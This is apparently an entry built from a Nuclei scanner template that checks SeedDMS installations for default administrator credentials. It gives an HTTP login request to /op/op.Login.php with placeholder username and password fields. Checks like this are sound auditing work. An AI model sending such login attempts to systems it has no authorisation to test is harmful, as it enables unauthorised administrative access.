# Nuclei Template: SeedDMS Default Login
**Template ID:** seeddms-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`seeddms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
SeedDMS default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /op/op.Login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

login={{username}}&pwd={{password}}&lang=
```

## References
- https://www.seeddms.org/index.php?id=2
- https://www.redhat.com/sysadmin/install-seeddms
